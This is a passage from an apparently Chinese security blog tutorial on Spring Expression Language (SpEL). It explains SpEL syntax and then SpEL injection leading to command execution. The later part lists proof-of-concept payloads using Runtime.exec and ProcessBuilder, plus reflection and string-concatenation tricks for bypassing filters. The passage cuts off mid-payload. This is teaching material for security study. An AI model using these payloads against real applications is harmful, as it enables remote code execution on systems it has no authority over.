class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;instrument&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;kenny.instrument&#125;&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;song&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;kenny.song&#125;&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>key 指定 <code>kenny&lt;bean&gt;</code> 的 id<br>value 指定 <code>kenny&lt;bean&gt;</code>的 song 属性。其等价于执行下面的代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Instrumentalist</span> <span class="hljs-variable">carl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Instrumentalist</span>();<br>carl.setSong(kenny.getSong());<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="1-5-引用类方法"><a href="#1-5-引用类方法" class="headerlink" title="1.5  引用类方法"></a>1.5  引用类方法</h2><p>SpEL 表达式还可以访问类的方法。</p>
+<p>假设现在有个 <code>SongSelector</code> 类，该类有个 <code>selectSong()</code> 方法，这样的话 Drunkbaby 就可以不用模仿别人，开始唱 <code>songSelector</code> 所选的歌了：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;song&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;SongSelector.selectSong()&#125;&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>carl 有个癖好，歌曲名不是大写的他就浑身难受，我们现在要做的就是仅仅对返回的歌曲调用 <code>toUpperCase()</code> 方法：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;song&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;SongSelector.selectSong().toUpperCase()&#125;&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>注意：这里我们不能确保不抛出 <code>NullPointerException</code>，为了避免这个讨厌的问题，我们可以使用 SpEL 的 <code>null-safe</code> 存取器：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;song&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;SongSelector.selectSong()?.toUpperCase()&#125;&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><code>?.</code> 符号会确保左边的表达式不会为 <code>null</code>，如果为 <code>null</code> 的话就不会调用 <code>toUpperCase()</code> 方法了。</p>
+<h2 id="1-6-类类型表达式-T-Type"><a href="#1-6-类类型表达式-T-Type" class="headerlink" title="1.6 类类型表达式 T(Type)"></a>1.6 类类型表达式 T(Type)</h2><p>在 SpEL 表达式中，使用 <code>T(Type)</code> 运算符会调用类的作用域和方法。换句话说，就是可以通过该类类型表达式来操作类。</p>
+<p>使用 <code>T(Type)</code> 来表示 <code>java.lang.Class</code> 实例，Type 必须是类全限定名，但 <code>”java.lang”</code> 包除外，因为 SpEL 已经内置了该包，即该包下的类可以不指定具体的包名；使用类类型表达式还可以进行访问类静态方法和类静态字段。</p>
+<p>这里就有潜在的攻击面了<br>因为我们 <code>java.lang.Runtime</code> 这个包也是包含于 <code>java.lang</code> 的包的，所以如果能调用 <code>Runtime</code>就可以进行命令执行</p>
+<p>在 XML 配置文件中的使用示例，要调用 <code>java.lang.Math</code> 来获取 0~1 的随机数:</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;random&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#</span></span></span><span class="hljs-template-variable">&#123;T(java.lang.<span class="hljs-keyword">Math</span>).random()&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>/&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>简单来说，<strong>在 SpEL 中， T(Type) 用于 获取一个 Java 类的 Class 对象</strong>，例如：</p>
+<p><code>T(java.lang.String)</code>  返回  <code>java.lang.String.class</code>。返回 Class 后，就可以调用类的静态方法、获取类的静态字段等等，而 T(Type) <strong>允许任意加载类、调用静态方法</strong>，那么也就可以执行敏感操作，例如：<code>T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</code>，如果上下文没有限制 SpEL 的访问类型，那么意味着：SpEL &#x3D; 远程命令访问。</p>
+<h3 id="1-6-1-Demo"><a href="#1-6-1-Demo" class="headerlink" title="1.6.1 Demo"></a>1.6.1 Demo</h3><p>修改 Demo.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">	   <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">	   <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag"> http://www.springframework.org/schema/beans/spring-beans-3.0.xsd &quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;helloWorld&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.src.basicspel.HelloWorld&quot;</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;message&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;&#x27;aaa&#x27;&#125; is #&#123;T(java.lang.Math).random()&#125;&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171209529.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="1-6-2-恶意调用并执行命令"><a href="#1-6-2-恶意调用并执行命令" class="headerlink" title="1.6.2 恶意调用并执行命令"></a>1.6.2 恶意调用并执行命令</h3><p>修改 Value 中的类类型表达式的类为 Runtime 并调用命令执行方法：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">	   <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">	   <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag"> http://www.springframework.org/schema/beans/spring-beans-3.0.xsd &quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;helloWorld&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.src.basicspel.HelloWorld&quot;</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;message&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;&#x27;aaa&#x27;&#125; is #&#123;T(java.lang.Runtime).getRuntime.exec(&#x27;calc&#x27;)&#125;&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171209602.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h1 id="2、SpEL-用法"><a href="#2、SpEL-用法" class="headerlink" title="2、SpEL 用法"></a>2、SpEL 用法</h1><p>SpEL 的用法有三种形式，一种是在注解 <code>@Value</code> 中；一种是 XML 配置；最后一种是在代码块中使用 Expression。</p>
+<h2 id="2-1-XML-配置"><a href="#2-1-XML-配置" class="headerlink" title="2.1  XML 配置"></a>2.1  XML 配置</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">	   <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">	   <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag"> http://www.springframework.org/schema/beans/spring-beans-3.0.xsd &quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;helloWorld&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.src.basicspel.HelloWorld&quot;</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;message&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;&#x27;aaa&#x27;&#125; is #&#123;T(java.lang.Runtime).getRuntime.exec(&#x27;calc&#x27;)&#125;&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-2-注解-Value"><a href="#2-2-注解-Value" class="headerlink" title="2.2 注解 @Value"></a>2.2 注解 <code>@Value</code></h2><p>这种形式的值一般是写在 properties 的配置文件中的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmailSender</span> &#123;<br>    <span class="hljs-meta">@Value(&quot;$&#123;spring.mail.username&#125;&quot;)</span><br>    <span class="hljs-keyword">private</span> String mailUsername;<br>    <span class="hljs-meta">@Value(&quot;#&#123; systemProperties[&#x27;user.region&#x27;] &#125;&quot;)</span>    <br>    <span class="hljs-keyword">private</span> String defaultLocale;<br>    <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-3-Expression-用法"><a href="#2-3-Expression-用法" class="headerlink" title="2.3 Expression 用法"></a>2.3 Expression 用法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//创建解析器</span><br><span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br><span class="hljs-comment">//解析表达式</span><br><span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;(&#x27;Hello&#x27; + &#x27; Drunkbaby&#x27;).concat(#end)&quot;</span>);<br><span class="hljs-comment">//构造上下文</span><br><span class="hljs-type">EvaluationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br><span class="hljs-comment">//求值</span><br>context.setVariable(<span class="hljs-string">&quot;end&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>);  <br>System.out.println(expression.getValue(context));<br></code></pre></td></tr></table></figure>
+
+<p>具体步骤如下：</p>
+<p>1、创建解析器：SpEL 使用 <code>ExpressionParser</code> 接口表示解析器，提供 <code>SpelExpressionParser</code> 默认实现；<br>2、解析表达式：使用 <code>ExpressionParser</code> 的 <code>parseExpression</code> 来解析相应的表达式为 <code>Expression</code> 对象；<br>3、构造上下文：准备比如变量定义等等表达式需要的上下文数据；<br>4、求值：通过 <code>Expression</code> 接口的 <code>getValue</code> 方法根据上下文获得表达式值；</p>
+<p><strong>主要接口：</strong></p>
+<ul>
+<li><strong>ExpressionParser 接口</strong>：表示解析器，默认实现是 <code>org.springframework.expression.spel.standard</code> 包中的 <code>SpelExpressionParser</code> 类，使用 <code>parseExpression</code> 方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符；</li>
+<li><strong>EvaluationContext 接口</strong>：表示上下文环境，默认实现是 <code>org.springframework.expression.spel.support</code> 包中的 <code>StandardEvaluationContext</code> 类，使用 <code>setRootObject</code> 方法来设置根对象，使用 <code>setVariable</code> 方法来注册自定义变量，使用 <code>registerFunction</code> 来注册自定义函数等等。</li>
+<li><strong>Expression 接口</strong>：表示表达式对象，默认实现是 <code>org.springframework.expression.spel.standard</code> 包中的 <code>SpelExpression</code>，提供 <code>getValue</code> 方法用于获取表达式值，提供 <code>setValue</code> 方法用于设置对象值。</li>
+</ul>
+<h3 id="2-3-1-Demo"><a href="#2-3-1-Demo" class="headerlink" title="2.3.1 Demo"></a>2.3.1 Demo</h3><p>程序会将这里传入 <code>parseExpression()</code> 函数的字符串参数 spel  作为 SpEL 表达式来解析，而无需通过 <code>#{}</code> 符号来注明</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.basicspel;<br><br><span class="hljs-keyword">import</span> org.springframework.expression.Expression;<br><span class="hljs-keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExpressionCalc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">spel</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;<br>        <span class="hljs-type">SpelExpressionParser</span> <span class="hljs-variable">spelExpressionParser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> spelExpressionParser.parseExpression(spel);<br>        System.out.println(expression.getValue());<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210056.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="2-3-2-类实例化"><a href="#2-3-2-类实例化" class="headerlink" title="2.3.2 类实例化"></a>2.3.2 类实例化</h3><p>类实例化同样使用 Java 关键字 new，类名必须是全限定名，但 <code>java.lang</code> 包内的类型除外。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.basicspel;<br><br><span class="hljs-keyword">import</span> org.springframework.expression.Expression;<br><span class="hljs-keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">newClass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">spel</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;new java.util.Date()&quot;</span>;<br>        <span class="hljs-type">SpelExpressionParser</span> <span class="hljs-variable">spelExpressionParser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> spelExpressionParser.parseExpression(spel);<br>        System.out.println(expression.getValue());<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210814.png" srcset="/img/loading.gif" lazyload alt="img">	</p>
+<h1 id="3、SpEL-表达式注入漏洞"><a href="#3、SpEL-表达式注入漏洞" class="headerlink" title="3、SpEL 表达式注入漏洞"></a>3、SpEL 表达式注入漏洞</h1><h2 id="3-1-漏洞原理"><a href="#3-1-漏洞原理" class="headerlink" title="3.1 漏洞原理"></a>3.1 漏洞原理</h2><p><code>SimpleEvaluationContext</code> 和 <code>StandardEvaluationContext</code> 是 SpEL 提供的两个 <code>EvaluationContext</code>：</p>
+<ul>
+<li>SimpleEvaluationContext : 针对不需要 SpEL 语言语法的全部范围并且应该受到有意限制的表达式类别，公开 SpEL 语言特性和配置选项的子集。</li>
+<li>StandardEvaluationContext : 公开全套 SpEL 语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</li>
+</ul>
+<p><code>SimpleEvaluationContext</code> 旨在仅支持 SpEL 语言语法的一个子集，不包括 Java 类型引用、构造函数和 bean 引用；而 <code>StandardEvaluationContext</code> 是支持全部 SpEL 语法的。</p>
+<p>由前面的 类类型表达式 知道，SpEL 表达式是可以操作类及其方法的，可以通过类类型表达式 <code>T(Type)</code> 来调用任意类方法。这是因为在不指定 <code>EvaluationContext</code> 的情况下默认采用的是 <code>StandardEvaluationContext</code>，而它包含了 SpEL 的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。</p>
+<p>例如 2.3 中的 Demo ：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.basicspel;<br><br><span class="hljs-keyword">import</span> org.springframework.expression.Expression;<br><span class="hljs-keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExpressionCalc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">spel</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;<br>        <span class="hljs-type">SpelExpressionParser</span> <span class="hljs-variable">spelExpressionParser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> spelExpressionParser.parseExpression(spel);<br>        System.out.println(expression.getValue());<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210366.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="3-2-通过反射的方式进行-SpEL-注入"><a href="#3-2-通过反射的方式进行-SpEL-注入" class="headerlink" title="3.2 通过反射的方式进行 SpEL 注入"></a>3.2 通过反射的方式进行 SpEL 注入</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReflectBypass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">spel</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(String).getClass().forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;<br>        <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(spel);<br>        System.out.println(expression.getValue());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-3-基础-Poc"><a href="#3-3-基础-Poc" class="headerlink" title="3.3 基础 Poc"></a>3.3 基础 Poc</h2><p>除了常见的 <code>Runtime</code> 的命令执行方法，还有<code>ProcessBuilder</code>进行命令执行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Runtime</span><br>T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)<br>T(Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)<br><br><span class="hljs-comment">// ProcessBuilder</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(&#123;<span class="hljs-string">&#x27;calc&#x27;</span>&#125;).start()<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(&#123;<span class="hljs-string">&#x27;calc&#x27;</span>&#125;).start()<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="3-4-基础-Bypass"><a href="#3-4-基础-Bypass" class="headerlink" title="3.4 基础 Bypass"></a>3.4 基础 Bypass</h2><h3 id="3-4-1-常见的-Bypass-技巧"><a href="#3-4-1-常见的-Bypass-技巧" class="headerlink" title="3.4.1  常见的 Bypass 技巧"></a>3.4.1  常见的 Bypass 技巧</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-comment">// 反射调用</span><br>T(String).getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)<br> <br><span class="hljs-comment">// 同上，需要有上下文环境</span><br>#<span class="hljs-built_in">this</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)<br> <br><span class="hljs-comment">// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤</span><br>T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)),<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/C&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br> <br><span class="hljs-comment">// 同上，需要有上下文环境</span><br>#<span class="hljs-built_in">this</span>.getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)),<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/C&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br> <br><span class="hljs-comment">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1</span><br><span class="hljs-comment">// byte数组内容的生成后面有脚本</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.String(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span 